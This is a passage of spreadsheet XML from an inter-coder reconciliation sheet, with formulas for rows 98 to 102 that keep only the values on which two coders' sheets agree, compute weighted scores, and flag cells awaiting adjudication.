        <f>IF(AND(Coder1!Q98&amp;""&lt;&gt;"",Coder1!Q98&amp;""=Coder2!Q98&amp;""),Coder1!Q98,"")</f>
        <v/>
      </c>
      <c r="R98" s="14">
        <f>IF(AND(Coder1!R98&amp;""&lt;&gt;"",Coder1!R98&amp;""=Coder2!R98&amp;""),Coder1!R98,"")</f>
        <v/>
      </c>
      <c r="S98" s="14">
        <f>IF(AND(Coder1!S98&amp;""&lt;&gt;"",Coder1!S98&amp;""=Coder2!S98&amp;""),Coder1!S98,"")</f>
        <v/>
      </c>
      <c r="T98" s="14">
        <f>IF(AND(Coder1!T98&amp;""&lt;&gt;"",Coder1!T98&amp;""=Coder2!T98&amp;""),Coder1!T98,"")</f>
        <v/>
      </c>
      <c r="U98" s="14">
        <f>IF(AND(Coder1!U98&amp;""&lt;&gt;"",Coder1!U98&amp;""=Coder2!U98&amp;""),Coder1!U98,"")</f>
        <v/>
      </c>
      <c r="V98" s="14">
        <f>IF(AND(Coder1!V98&amp;""&lt;&gt;"",Coder1!V98&amp;""=Coder2!V98&amp;""),Coder1!V98,"")</f>
        <v/>
      </c>
      <c r="W98" s="14">
        <f>IF(AND(Coder1!W98&amp;""&lt;&gt;"",Coder1!W98&amp;""=Coder2!W98&amp;""),Coder1!W98,"")</f>
        <v/>
      </c>
      <c r="X98" s="14">
        <f>IF(AND(Coder1!X98&amp;""&lt;&gt;"",Coder1!X98&amp;""=Coder2!X98&amp;""),Coder1!X98,"")</f>
        <v/>
      </c>
      <c r="Y98" s="14">
        <f>IF(AND(Coder1!Y98&amp;""&lt;&gt;"",Coder1!Y98&amp;""=Coder2!Y98&amp;""),Coder1!Y98,"")</f>
        <v/>
      </c>
      <c r="Z98" s="14">
        <f>IF(AND(Coder1!Z98&amp;""&lt;&gt;"",Coder1!Z98&amp;""=Coder2!Z98&amp;""),Coder1!Z98,"")</f>
        <v/>
      </c>
      <c r="AA98" s="14">
        <f>IF(AND(Coder1!AA98&amp;""&lt;&gt;"",Coder1!AA98&amp;""=Coder2!AA98&amp;""),Coder1!AA98,"")</f>
        <v/>
      </c>
      <c r="AB98" s="14">
        <f>IF(AND(Coder1!AB98&amp;""&lt;&gt;"",Coder1!AB98&amp;""=Coder2!AB98&amp;""),Coder1!AB98,"")</f>
        <v/>
      </c>
      <c r="AC98" s="14">
        <f>IF(AND(Coder1!AC98&amp;""&lt;&gt;"",Coder1!AC98&amp;""=Coder2!AC98&amp;""),Coder1!AC98,"")</f>
        <v/>
      </c>
      <c r="AD98" s="14">
        <f>IF(AND(Coder1!AD98&amp;""&lt;&gt;"",Coder1!AD98&amp;""=Coder2!AD98&amp;""),Coder1!AD98,"")</f>
        <v/>
      </c>
      <c r="AE98" s="14">
        <f>IF(AND(Coder1!AE98&amp;""&lt;&gt;"",Coder1!AE98&amp;""=Coder2!AE98&amp;""),Coder1!AE98,"")</f>
        <v/>
      </c>
      <c r="AF98" s="14">
        <f>IF(AND(Coder1!AF98&amp;""&lt;&gt;"",Coder1!AF98&amp;""=Coder2!AF98&amp;""),Coder1!AF98,"")</f>
        <v/>
      </c>
      <c r="AG98" s="14">
        <f>IF(AND(Coder1!AG98&amp;""&lt;&gt;"",Coder1!AG98&amp;""=Coder2!AG98&amp;""),Coder1!AG98,"")</f>
        <v/>
      </c>
      <c r="AH98" s="14">
        <f>IF(AND(Coder1!AH98&amp;""&lt;&gt;"",Coder1!AH98&amp;""=Coder2!AH98&amp;""),Coder1!AH98,"")</f>
        <v/>
      </c>
      <c r="AI98" s="11">
        <f>IF(COUNT(E98:L98)=0,"",SUM(E98:L98))</f>
        <v/>
      </c>
      <c r="AJ98" s="11">
        <f>IF(AI98="","",N(E98)*3+N(F98)*2+N(G98)*2+N(H98)*2+N(I98)*2+N(J98)*3+N(K98)*3+N(L98)*3)</f>
        <v/>
      </c>
      <c r="AK98" s="11">
        <f>IF(AI98="","",COUNTIF(N98:AG98,1))</f>
        <v/>
      </c>
      <c r="AL98" s="11">
        <f>IF(OR(AJ98="",AJ98=0),"",ROUND(100*(AJ98-AK98)/AJ98,1))</f>
        <v/>
      </c>
      <c r="AM98" s="11">
        <f>IF(AND(Coder1!AN98=1,Coder2!AN98=1),IF(COUNTBLANK(E98:AH98)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN98" s="11">
        <f>IF(AND(Coder1!AN98=1,Coder2!AN98=1),IF(SUMPRODUCT(--(Coder1!E98:AH98&amp;""&lt;&gt;Coder2!E98:AH98&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO98" s="11" t="n"/>
    </row>
    <row r="99">
      <c r="A99" s="11">
        <f>Coder1!A99</f>
        <v/>
      </c>
      <c r="B99" s="11">
        <f>Coder1!B99</f>
        <v/>
      </c>
      <c r="C99" s="11">
        <f>Coder1!C99</f>
        <v/>
      </c>
      <c r="D99" s="11">
        <f>Coder1!D99</f>
        <v/>
      </c>
      <c r="E99" s="14">
        <f>IF(AND(Coder1!E99&amp;""&lt;&gt;"",Coder1!E99&amp;""=Coder2!E99&amp;""),Coder1!E99,"")</f>
        <v/>
      </c>
      <c r="F99" s="14">
        <f>IF(AND(Coder1!F99&amp;""&lt;&gt;"",Coder1!F99&amp;""=Coder2!F99&amp;""),Coder1!F99,"")</f>
        <v/>
      </c>
      <c r="G99" s="14">
        <f>IF(AND(Coder1!G99&amp;""&lt;&gt;"",Coder1!G99&amp;""=Coder2!G99&amp;""),Coder1!G99,"")</f>
        <v/>
      </c>
      <c r="H99" s="14">
        <f>IF(AND(Coder1!H99&amp;""&lt;&gt;"",Coder1!H99&amp;""=Coder2!H99&amp;""),Coder1!H99,"")</f>
        <v/>
      </c>
      <c r="I99" s="14">
        <f>IF(AND(Coder1!I99&amp;""&lt;&gt;"",Coder1!I99&amp;""=Coder2!I99&amp;""),Coder1!I99,"")</f>
        <v/>
      </c>
      <c r="J99" s="14">
        <f>IF(AND(Coder1!J99&amp;""&lt;&gt;"",Coder1!J99&amp;""=Coder2!J99&amp;""),Coder1!J99,"")</f>
        <v/>
      </c>
      <c r="K99" s="14">
        <f>IF(AND(Coder1!K99&amp;""&lt;&gt;"",Coder1!K99&amp;""=Coder2!K99&amp;""),Coder1!K99,"")</f>
        <v/>
      </c>
      <c r="L99" s="14">
        <f>IF(AND(Coder1!L99&amp;""&lt;&gt;"",Coder1!L99&amp;""=Coder2!L99&amp;""),Coder1!L99,"")</f>
        <v/>
      </c>
      <c r="M99" s="14">
        <f>IF(AND(Coder1!M99&amp;""&lt;&gt;"",Coder1!M99&amp;""=Coder2!M99&amp;""),Coder1!M99,"")</f>
        <v/>
      </c>
      <c r="N99" s="14">
        <f>IF(AND(Coder1!N99&amp;""&lt;&gt;"",Coder1!N99&amp;""=Coder2!N99&amp;""),Coder1!N99,"")</f>
        <v/>
      </c>
      <c r="O99" s="14">
        <f>IF(AND(Coder1!O99&amp;""&lt;&gt;"",Coder1!O99&amp;""=Coder2!O99&amp;""),Coder1!O99,"")</f>
        <v/>
      </c>
      <c r="P99" s="14">
        <f>IF(AND(Coder1!P99&amp;""&lt;&gt;"",Coder1!P99&amp;""=Coder2!P99&amp;""),Coder1!P99,"")</f>
        <v/>
      </c>
      <c r="Q99" s="14">
        <f>IF(AND(Coder1!Q99&amp;""&lt;&gt;"",Coder1!Q99&amp;""=Coder2!Q99&amp;""),Coder1!Q99,"")</f>
        <v/>
      </c>
      <c r="R99" s="14">
        <f>IF(AND(Coder1!R99&amp;""&lt;&gt;"",Coder1!R99&amp;""=Coder2!R99&amp;""),Coder1!R99,"")</f>
        <v/>
      </c>
      <c r="S99" s="14">
        <f>IF(AND(Coder1!S99&amp;""&lt;&gt;"",Coder1!S99&amp;""=Coder2!S99&amp;""),Coder1!S99,"")</f>
        <v/>
      </c>
      <c r="T99" s="14">
        <f>IF(AND(Coder1!T99&amp;""&lt;&gt;"",Coder1!T99&amp;""=Coder2!T99&amp;""),Coder1!T99,"")</f>
        <v/>
      </c>
      <c r="U99" s="14">
        <f>IF(AND(Coder1!U99&amp;""&lt;&gt;"",Coder1!U99&amp;""=Coder2!U99&amp;""),Coder1!U99,"")</f>
        <v/>
      </c>
      <c r="V99" s="14">
        <f>IF(AND(Coder1!V99&amp;""&lt;&gt;"",Coder1!V99&amp;""=Coder2!V99&amp;""),Coder1!V99,"")</f>
        <v/>
      </c>
      <c r="W99" s="14">
        <f>IF(AND(Coder1!W99&amp;""&lt;&gt;"",Coder1!W99&amp;""=Coder2!W99&amp;""),Coder1!W99,"")</f>
        <v/>
      </c>
      <c r="X99" s="14">
        <f>IF(AND(Coder1!X99&amp;""&lt;&gt;"",Coder1!X99&amp;""=Coder2!X99&amp;""),Coder1!X99,"")</f>
        <v/>
      </c>
      <c r="Y99" s="14">
        <f>IF(AND(Coder1!Y99&amp;""&lt;&gt;"",Coder1!Y99&amp;""=Coder2!Y99&amp;""),Coder1!Y99,"")</f>
        <v/>
      </c>
      <c r="Z99" s="14">
        <f>IF(AND(Coder1!Z99&amp;""&lt;&gt;"",Coder1!Z99&amp;""=Coder2!Z99&amp;""),Coder1!Z99,"")</f>
        <v/>
      </c>
      <c r="AA99" s="14">
        <f>IF(AND(Coder1!AA99&amp;""&lt;&gt;"",Coder1!AA99&amp;""=Coder2!AA99&amp;""),Coder1!AA99,"")</f>
        <v/>
      </c>
      <c r="AB99" s="14">
        <f>IF(AND(Coder1!AB99&amp;""&lt;&gt;"",Coder1!AB99&amp;""=Coder2!AB99&amp;""),Coder1!AB99,"")</f>
        <v/>
      </c>
      <c r="AC99" s="14">
        <f>IF(AND(Coder1!AC99&amp;""&lt;&gt;"",Coder1!AC99&amp;""=Coder2!AC99&amp;""),Coder1!AC99,"")</f>
        <v/>
      </c>
      <c r="AD99" s="14">
        <f>IF(AND(Coder1!AD99&amp;""&lt;&gt;"",Coder1!AD99&amp;""=Coder2!AD99&amp;""),Coder1!AD99,"")</f>
        <v/>
      </c>
      <c r="AE99" s="14">
        <f>IF(AND(Coder1!AE99&amp;""&lt;&gt;"",Coder1!AE99&amp;""=Coder2!AE99&amp;""),Coder1!AE99,"")</f>
        <v/>
      </c>
      <c r="AF99" s="14">
        <f>IF(AND(Coder1!AF99&amp;""&lt;&gt;"",Coder1!AF99&amp;""=Coder2!AF99&amp;""),Coder1!AF99,"")</f>
        <v/>
      </c>
      <c r="AG99" s="14">
        <f>IF(AND(Coder1!AG99&amp;""&lt;&gt;"",Coder1!AG99&amp;""=Coder2!AG99&amp;""),Coder1!AG99,"")</f>
        <v/>
      </c>
      <c r="AH99" s="14">
        <f>IF(AND(Coder1!AH99&amp;""&lt;&gt;"",Coder1!AH99&amp;""=Coder2!AH99&amp;""),Coder1!AH99,"")</f>
        <v/>
      </c>
      <c r="AI99" s="11">
        <f>IF(COUNT(E99:L99)=0,"",SUM(E99:L99))</f>
        <v/>
      </c>
      <c r="AJ99" s="11">
        <f>IF(AI99="","",N(E99)*3+N(F99)*2+N(G99)*2+N(H99)*2+N(I99)*2+N(J99)*3+N(K99)*3+N(L99)*3)</f>
        <v/>
      </c>
      <c r="AK99" s="11">
        <f>IF(AI99="","",COUNTIF(N99:AG99,1))</f>
        <v/>
      </c>
      <c r="AL99" s="11">
        <f>IF(OR(AJ99="",AJ99=0),"",ROUND(100*(AJ99-AK99)/AJ99,1))</f>
        <v/>
      </c>
      <c r="AM99" s="11">
        <f>IF(AND(Coder1!AN99=1,Coder2!AN99=1),IF(COUNTBLANK(E99:AH99)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN99" s="11">
        <f>IF(AND(Coder1!AN99=1,Coder2!AN99=1),IF(SUMPRODUCT(--(Coder1!E99:AH99&amp;""&lt;&gt;Coder2!E99:AH99&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO99" s="11" t="n"/>
    </row>
    <row r="100">
      <c r="A100" s="11">
        <f>Coder1!A100</f>
        <v/>
      </c>
      <c r="B100" s="11">
        <f>Coder1!B100</f>
        <v/>
      </c>
      <c r="C100" s="11">
        <f>Coder1!C100</f>
        <v/>
      </c>
      <c r="D100" s="11">
        <f>Coder1!D100</f>
        <v/>
      </c>
      <c r="E100" s="14">
        <f>IF(AND(Coder1!E100&amp;""&lt;&gt;"",Coder1!E100&amp;""=Coder2!E100&amp;""),Coder1!E100,"")</f>
        <v/>
      </c>
      <c r="F100" s="14">
        <f>IF(AND(Coder1!F100&amp;""&lt;&gt;"",Coder1!F100&amp;""=Coder2!F100&amp;""),Coder1!F100,"")</f>
        <v/>
      </c>
      <c r="G100" s="14">
        <f>IF(AND(Coder1!G100&amp;""&lt;&gt;"",Coder1!G100&amp;""=Coder2!G100&amp;""),Coder1!G100,"")</f>
        <v/>
      </c>
      <c r="H100" s="14">
        <f>IF(AND(Coder1!H100&amp;""&lt;&gt;"",Coder1!H100&amp;""=Coder2!H100&amp;""),Coder1!H100,"")</f>
        <v/>
      </c>
      <c r="I100" s="14">
        <f>IF(AND(Coder1!I100&amp;""&lt;&gt;"",Coder1!I100&amp;""=Coder2!I100&amp;""),Coder1!I100,"")</f>
        <v/>
      </c>
      <c r="J100" s="14">
        <f>IF(AND(Coder1!J100&amp;""&lt;&gt;"",Coder1!J100&amp;""=Coder2!J100&amp;""),Coder1!J100,"")</f>
        <v/>
      </c>
      <c r="K100" s="14">
        <f>IF(AND(Coder1!K100&amp;""&lt;&gt;"",Coder1!K100&amp;""=Coder2!K100&amp;""),Coder1!K100,"")</f>
        <v/>
      </c>
      <c r="L100" s="14">
        <f>IF(AND(Coder1!L100&amp;""&lt;&gt;"",Coder1!L100&amp;""=Coder2!L100&amp;""),Coder1!L100,"")</f>
        <v/>
      </c>
      <c r="M100" s="14">
        <f>IF(AND(Coder1!M100&amp;""&lt;&gt;"",Coder1!M100&amp;""=Coder2!M100&amp;""),Coder1!M100,"")</f>
        <v/>
      </c>
      <c r="N100" s="14">
        <f>IF(AND(Coder1!N100&amp;""&lt;&gt;"",Coder1!N100&amp;""=Coder2!N100&amp;""),Coder1!N100,"")</f>
        <v/>
      </c>
      <c r="O100" s="14">
        <f>IF(AND(Coder1!O100&amp;""&lt;&gt;"",Coder1!O100&amp;""=Coder2!O100&amp;""),Coder1!O100,"")</f>
        <v/>
      </c>
      <c r="P100" s="14">
        <f>IF(AND(Coder1!P100&amp;""&lt;&gt;"",Coder1!P100&amp;""=Coder2!P100&amp;""),Coder1!P100,"")</f>
        <v/>
      </c>
      <c r="Q100" s="14">
        <f>IF(AND(Coder1!Q100&amp;""&lt;&gt;"",Coder1!Q100&amp;""=Coder2!Q100&amp;""),Coder1!Q100,"")</f>
        <v/>
      </c>
      <c r="R100" s="14">
        <f>IF(AND(Coder1!R100&amp;""&lt;&gt;"",Coder1!R100&amp;""=Coder2!R100&amp;""),Coder1!R100,"")</f>
        <v/>
      </c>
      <c r="S100" s="14">
        <f>IF(AND(Coder1!S100&amp;""&lt;&gt;"",Coder1!S100&amp;""=Coder2!S100&amp;""),Coder1!S100,"")</f>
        <v/>
      </c>
      <c r="T100" s="14">
        <f>IF(AND(Coder1!T100&amp;""&lt;&gt;"",Coder1!T100&amp;""=Coder2!T100&amp;""),Coder1!T100,"")</f>
        <v/>
      </c>
      <c r="U100" s="14">
        <f>IF(AND(Coder1!U100&amp;""&lt;&gt;"",Coder1!U100&amp;""=Coder2!U100&amp;""),Coder1!U100,"")</f>
        <v/>
      </c>
      <c r="V100" s="14">
        <f>IF(AND(Coder1!V100&amp;""&lt;&gt;"",Coder1!V100&amp;""=Coder2!V100&amp;""),Coder1!V100,"")</f>
        <v/>
      </c>
      <c r="W100" s="14">
        <f>IF(AND(Coder1!W100&amp;""&lt;&gt;"",Coder1!W100&amp;""=Coder2!W100&amp;""),Coder1!W100,"")</f>
        <v/>
      </c>
      <c r="X100" s="14">
        <f>IF(AND(Coder1!X100&amp;""&lt;&gt;"",Coder1!X100&amp;""=Coder2!X100&amp;""),Coder1!X100,"")</f>
        <v/>
      </c>
      <c r="Y100" s="14">
        <f>IF(AND(Coder1!Y100&amp;""&lt;&gt;"",Coder1!Y100&amp;""=Coder2!Y100&amp;""),Coder1!Y100,"")</f>
        <v/>
      </c>
      <c r="Z100" s="14">
        <f>IF(AND(Coder1!Z100&amp;""&lt;&gt;"",Coder1!Z100&amp;""=Coder2!Z100&amp;""),Coder1!Z100,"")</f>
        <v/>
      </c>
      <c r="AA100" s="14">
        <f>IF(AND(Coder1!AA100&amp;""&lt;&gt;"",Coder1!AA100&amp;""=Coder2!AA100&amp;""),Coder1!AA100,"")</f>
        <v/>
      </c>
      <c r="AB100" s="14">
        <f>IF(AND(Coder1!AB100&amp;""&lt;&gt;"",Coder1!AB100&amp;""=Coder2!AB100&amp;""),Coder1!AB100,"")</f>
        <v/>
      </c>
      <c r="AC100" s="14">
        <f>IF(AND(Coder1!AC100&amp;""&lt;&gt;"",Coder1!AC100&amp;""=Coder2!AC100&amp;""),Coder1!AC100,"")</f>
        <v/>
      </c>
      <c r="AD100" s="14">
        <f>IF(AND(Coder1!AD100&amp;""&lt;&gt;"",Coder1!AD100&amp;""=Coder2!AD100&amp;""),Coder1!AD100,"")</f>
        <v/>
      </c>
      <c r="AE100" s="14">
        <f>IF(AND(Coder1!AE100&amp;""&lt;&gt;"",Coder1!AE100&amp;""=Coder2!AE100&amp;""),Coder1!AE100,"")</f>
        <v/>
      </c>
      <c r="AF100" s="14">
        <f>IF(AND(Coder1!AF100&amp;""&lt;&gt;"",Coder1!AF100&amp;""=Coder2!AF100&amp;""),Coder1!AF100,"")</f>
        <v/>
      </c>
      <c r="AG100" s="14">
        <f>IF(AND(Coder1!AG100&amp;""&lt;&gt;"",Coder1!AG100&amp;""=Coder2!AG100&amp;""),Coder1!AG100,"")</f>
        <v/>
      </c>
      <c r="AH100" s="14">
        <f>IF(AND(Coder1!AH100&amp;""&lt;&gt;"",Coder1!AH100&amp;""=Coder2!AH100&amp;""),Coder1!AH100,"")</f>
        <v/>
      </c>
      <c r="AI100" s="11">
        <f>IF(COUNT(E100:L100)=0,"",SUM(E100:L100))</f>
        <v/>
      </c>
      <c r="AJ100" s="11">
        <f>IF(AI100="","",N(E100)*3+N(F100)*2+N(G100)*2+N(H100)*2+N(I100)*2+N(J100)*3+N(K100)*3+N(L100)*3)</f>
        <v/>
      </c>
      <c r="AK100" s="11">
        <f>IF(AI100="","",COUNTIF(N100:AG100,1))</f>
        <v/>
      </c>
      <c r="AL100" s="11">
        <f>IF(OR(AJ100="",AJ100=0),"",ROUND(100*(AJ100-AK100)/AJ100,1))</f>
        <v/>
      </c>
      <c r="AM100" s="11">
        <f>IF(AND(Coder1!AN100=1,Coder2!AN100=1),IF(COUNTBLANK(E100:AH100)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN100" s="11">
        <f>IF(AND(Coder1!AN100=1,Coder2!AN100=1),IF(SUMPRODUCT(--(Coder1!E100:AH100&amp;""&lt;&gt;Coder2!E100:AH100&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO100" s="11" t="n"/>
    </row>
    <row r="101">
      <c r="A101" s="11">
        <f>Coder1!A101</f>
        <v/>
      </c>
      <c r="B101" s="11">
        <f>Coder1!B101</f>
        <v/>
      </c>
      <c r="C101" s="11">
        <f>Coder1!C101</f>
        <v/>
      </c>
      <c r="D101" s="11">
        <f>Coder1!D101</f>
        <v/>
      </c>
      <c r="E101" s="14">
        <f>IF(AND(Coder1!E101&amp;""&lt;&gt;"",Coder1!E101&amp;""=Coder2!E101&amp;""),Coder1!E101,"")</f>
        <v/>
      </c>
      <c r="F101" s="14">
        <f>IF(AND(Coder1!F101&amp;""&lt;&gt;"",Coder1!F101&amp;""=Coder2!F101&amp;""),Coder1!F101,"")</f>
        <v/>
      </c>
      <c r="G101" s="14">
        <f>IF(AND(Coder1!G101&amp;""&lt;&gt;"",Coder1!G101&amp;""=Coder2!G101&amp;""),Coder1!G101,"")</f>
        <v/>
      </c>
      <c r="H101" s="14">
        <f>IF(AND(Coder1!H101&amp;""&lt;&gt;"",Coder1!H101&amp;""=Coder2!H101&amp;""),Coder1!H101,"")</f>
        <v/>
      </c>
      <c r="I101" s="14">
        <f>IF(AND(Coder1!I101&amp;""&lt;&gt;"",Coder1!I101&amp;""=Coder2!I101&amp;""),Coder1!I101,"")</f>
        <v/>
      </c>
      <c r="J101" s="14">
        <f>IF(AND(Coder1!J101&amp;""&lt;&gt;"",Coder1!J101&amp;""=Coder2!J101&amp;""),Coder1!J101,"")</f>
        <v/>
      </c>
      <c r="K101" s="14">
        <f>IF(AND(Coder1!K101&amp;""&lt;&gt;"",Coder1!K101&amp;""=Coder2!K101&amp;""),Coder1!K101,"")</f>
        <v/>
      </c>
      <c r="L101" s="14">
        <f>IF(AND(Coder1!L101&amp;""&lt;&gt;"",Coder1!L101&amp;""=Coder2!L101&amp;""),Coder1!L101,"")</f>
        <v/>
      </c>
      <c r="M101" s="14">
        <f>IF(AND(Coder1!M101&amp;""&lt;&gt;"",Coder1!M101&amp;""=Coder2!M101&amp;""),Coder1!M101,"")</f>
        <v/>
      </c>
      <c r="N101" s="14">
        <f>IF(AND(Coder1!N101&amp;""&lt;&gt;"",Coder1!N101&amp;""=Coder2!N101&amp;""),Coder1!N101,"")</f>
        <v/>
      </c>
      <c r="O101" s="14">
        <f>IF(AND(Coder1!O101&amp;""&lt;&gt;"",Coder1!O101&amp;""=Coder2!O101&amp;""),Coder1!O101,"")</f>
        <v/>
      </c>
      <c r="P101" s="14">
        <f>IF(AND(Coder1!P101&amp;""&lt;&gt;"",Coder1!P101&amp;""=Coder2!P101&amp;""),Coder1!P101,"")</f>
        <v/>
      </c>
      <c r="Q101" s="14">
        <f>IF(AND(Coder1!Q101&amp;""&lt;&gt;"",Coder1!Q101&amp;""=Coder2!Q101&amp;""),Coder1!Q101,"")</f>
        <v/>
      </c>
      <c r="R101" s="14">
        <f>IF(AND(Coder1!R101&amp;""&lt;&gt;"",Coder1!R101&amp;""=Coder2!R101&amp;""),Coder1!R101,"")</f>
        <v/>
      </c>
      <c r="S101" s="14">
        <f>IF(AND(Coder1!S101&amp;""&lt;&gt;"",Coder1!S101&amp;""=Coder2!S101&amp;""),Coder1!S101,"")</f>
        <v/>
      </c>
      <c r="T101" s="14">
        <f>IF(AND(Coder1!T101&amp;""&lt;&gt;"",Coder1!T101&amp;""=Coder2!T101&amp;""),Coder1!T101,"")</f>
        <v/>
      </c>
      <c r="U101" s="14">
        <f>IF(AND(Coder1!U101&amp;""&lt;&gt;"",Coder1!U101&amp;""=Coder2!U101&amp;""),Coder1!U101,"")</f>
        <v/>
      </c>
      <c r="V101" s="14">
        <f>IF(AND(Coder1!V101&amp;""&lt;&gt;"",Coder1!V101&amp;""=Coder2!V101&amp;""),Coder1!V101,"")</f>
        <v/>
      </c>
      <c r="W101" s="14">
        <f>IF(AND(Coder1!W101&amp;""&lt;&gt;"",Coder1!W101&amp;""=Coder2!W101&amp;""),Coder1!W101,"")</f>
        <v/>
      </c>
      <c r="X101" s="14">
        <f>IF(AND(Coder1!X101&amp;""&lt;&gt;"",Coder1!X101&amp;""=Coder2!X101&amp;""),Coder1!X101,"")</f>
        <v/>
      </c>
      <c r="Y101" s="14">
        <f>IF(AND(Coder1!Y101&amp;""&lt;&gt;"",Coder1!Y101&amp;""=Coder2!Y101&amp;""),Coder1!Y101,"")</f>
        <v/>
      </c>
      <c r="Z101" s="14">
        <f>IF(AND(Coder1!Z101&amp;""&lt;&gt;"",Coder1!Z101&amp;""=Coder2!Z101&amp;""),Coder1!Z101,"")</f>
        <v/>
      </c>
      <c r="AA101" s="14">
        <f>IF(AND(Coder1!AA101&amp;""&lt;&gt;"",Coder1!AA101&amp;""=Coder2!AA101&amp;""),Coder1!AA101,"")</f>
        <v/>
      </c>
      <c r="AB101" s="14">
        <f>IF(AND(Coder1!AB101&amp;""&lt;&gt;"",Coder1!AB101&amp;""=Coder2!AB101&amp;""),Coder1!AB101,"")</f>
        <v/>
      </c>
      <c r="AC101" s="14">
        <f>IF(AND(Coder1!AC101&amp;""&lt;&gt;"",Coder1!AC101&amp;""=Coder2!AC101&amp;""),Coder1!AC101,"")</f>
        <v/>
      </c>
      <c r="AD101" s="14">
        <f>IF(AND(Coder1!AD101&amp;""&lt;&gt;"",Coder1!AD101&amp;""=Coder2!AD101&amp;""),Coder1!AD101,"")</f>
        <v/>
      </c>
      <c r="AE101" s="14">
        <f>IF(AND(Coder1!AE101&amp;""&lt;&gt;"",Coder1!AE101&amp;""=Coder2!AE101&amp;""),Coder1!AE101,"")</f>
        <v/>
      </c>
      <c r="AF101" s="14">
        <f>IF(AND(Coder1!AF101&amp;""&lt;&gt;"",Coder1!AF101&amp;""=Coder2!AF101&amp;""),Coder1!AF101,"")</f>
        <v/>
      </c>
      <c r="AG101" s="14">
        <f>IF(AND(Coder1!AG101&amp;""&lt;&gt;"",Coder1!AG101&amp;""=Coder2!AG101&amp;""),Coder1!AG101,"")</f>
        <v/>
      </c>
      <c r="AH101" s="14">
        <f>IF(AND(Coder1!AH101&amp;""&lt;&gt;"",Coder1!AH101&amp;""=Coder2!AH101&amp;""),Coder1!AH101,"")</f>
        <v/>
      </c>
      <c r="AI101" s="11">
        <f>IF(COUNT(E101:L101)=0,"",SUM(E101:L101))</f>
        <v/>
      </c>
      <c r="AJ101" s="11">
        <f>IF(AI101="","",N(E101)*3+N(F101)*2+N(G101)*2+N(H101)*2+N(I101)*2+N(J101)*3+N(K101)*3+N(L101)*3)</f>
        <v/>
      </c>
      <c r="AK101" s="11">
        <f>IF(AI101="","",COUNTIF(N101:AG101,1))</f>
        <v/>
      </c>
      <c r="AL101" s="11">
        <f>IF(OR(AJ101="",AJ101=0),"",ROUND(100*(AJ101-AK101)/AJ101,1))</f>
        <v/>
      </c>
      <c r="AM101" s="11">
        <f>IF(AND(Coder1!AN101=1,Coder2!AN101=1),IF(COUNTBLANK(E101:AH101)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN101" s="11">
        <f>IF(AND(Coder1!AN101=1,Coder2!AN101=1),IF(SUMPRODUCT(--(Coder1!E101:AH101&amp;""&lt;&gt;Coder2!E101:AH101&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO101" s="11" t="n"/>
    </row>
    <row r="102">
      <c r="A102" s="11">
        <f>Coder1!A102</f>
        <v/>
      </c>
      <c r="B102" s="11">
        <f>Coder1!B102</f>
        <v/>
      </c>
      <c r="C102" s="11">
        <f>Coder1!C102</f>
        <v/>
      </c>
      <c r="D102" s="11">
        <f>Coder1!D102</f>
        <v/>
      </c>
      <c r="E102" s="14">
        <f>IF(AND(Coder1!E102&amp;""&lt;&gt;"",Coder1!E102&amp;""=Coder2!E102&amp;""),Coder1!E102,"")</f>
        <v/>
      </c>
      <c r="F102" s="14">
        <f>IF(AND(Coder1!F102&amp;""&lt;&gt;"",Coder1!F102&amp;""=Coder2!F102&amp;""),Coder1!F102,"")</f>
        <v/>
      </c>
      <c r="G102" s="14">
        <f>IF(AND(Coder1!G102&amp;""&lt;&gt;"",Coder1!G102&amp;""=Coder2!G102&amp;""),Coder1!G102,"")</f>
        <v/>
      </c>
      <c r="H102" s="14">
        <f>IF(AND(Coder1!H102&amp;""&lt;&gt;"",Coder1!H102&amp;""=Coder2!H102&amp;""),Coder1!H102,"")</f>
        <v/>
      </c>
      <c r="I102" s="14">
        <f>IF(AND(Coder1!I102&amp;""&lt;&gt;"",Coder1!I102&amp;""=Coder2!I102&amp;""),Coder1!I102,"")</f>
        <v/>
      </c>
      <c r="J102" s="14">
        <f>IF(AND(Coder1!J102&amp;""&lt;&gt;"",Coder1!J102&amp;""=Coder2!J102&amp;""),Coder1!J102,"")</f>
        <v/>
      </c>
      <c r="K102" s="14">
        <f>IF(AND(Coder1!K102&amp;""&lt;&gt;"",Coder1!K102&amp;""=Coder2!K102&amp;""),Coder1!K102,"")</f>
        <v/>
      </c>
      <c r="L102" s="14">
        <f>IF(AND(Coder1!L102&amp;""&lt;&gt;"",Coder1!L102&amp;""=Coder2!L102&amp;""),Coder1!L102,"")</f>
        <v/>
      </c>
      <c r="M102" s="14">
        <f>IF(AND(Coder1!M102&amp;""&lt;&gt;"",Coder1!M102&amp;""=Coder2!M102&amp;""),Coder1!M102,"")</f>
        <v/>
      </c>
      <c r="N102" s="14">
        <f>IF(AND(Coder1!N102&amp;""&lt;&gt;"",Coder1!N102&amp;""=Coder2!N102&amp;""),Coder1!N102,"")</f>
        <v/>
      </c>
      <c r="O102" s="14">
        <f>IF(AND(Coder1!O102&amp;""&lt;&gt;"",Coder1!O102&amp;""=Coder2!O102&amp;""),Coder1!O102,"")</f>
        <v/>
      </c>
      <c r="P102" s="14">
        <f>IF(AND(Coder1!P102&amp;""&lt;&gt;"",Coder1!P102&amp;""=Coder2!P102&amp;""),Coder1!P102,"")</f>
        <v/>
      </c>
      <c r="Q102" s="14">
        <f>IF(AND(Coder1!Q102&amp;""&lt;&gt;"",Coder1!Q102&amp;""=Coder2!Q102&amp;""),Coder1!Q102,"")</f>
        <v/>
      </c>
      <c r="R102" s="14">
        <f>IF(AND(Coder1!R102&amp;""&lt;&gt;"",Coder1!R102&amp;""=Coder2!R102&amp;""),Coder1!R102,"")</f>
        <v/>
      </c>
      <c r="S102" s="14">
        <f>IF(AND(Coder1!S102&amp;""&lt;&gt;"",Coder1!S102&amp;""=Coder2!S102&amp;""),Coder1!S102,"")</f>
        <v/>
      </c>
      <c r="T102" s="14">
